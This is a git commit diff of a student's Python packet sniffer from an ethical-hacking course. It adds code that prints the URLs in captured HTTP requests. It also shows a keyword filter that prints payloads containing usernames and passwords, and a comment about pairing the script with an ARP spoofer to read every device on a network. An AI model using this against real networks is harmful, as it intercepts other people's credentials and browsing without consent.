974280bf0b27356e5e36e08055e377a2f11fef52
Brenyn <brenynk@gmail.com>
2020-05-25 03:52:45 -0400

    added additional filters to find all URLs visited

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,10 +6,10 @@
 # Course: Learn Python and Ethical Hacking From Scratch - StationX
 # Instructor: Zaid Al Quraishi
 # Purpose: Create a packet sniffer
-# Input(s): 
-# Output(s): 
+# Input(s): Device to sniff
+# Output(s): Filters out relevant data
 #
-# Notes to self:
+# Notes to self: Can be used with arp spoofer to read from all devices on a network
 #
 ##########################################################################################################
 
@@ -21,6 +21,11 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
+
+		#print(packet.show()) #show all fields in the packet
+		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+		print(url)
+
 		if packet.haslayer(scapy.Raw):
 			load = (packet[scapy.Raw].load) # only print from load inside of raw layer
 			keywords = ["username", "Username","user", "login", "password", "pass","Password"]
@@ -28,5 +33,4 @@ def process_sniffed_packet(packet):
 				if keyword in load:
 					print(load)
 					break
-
 sniff("eth0")
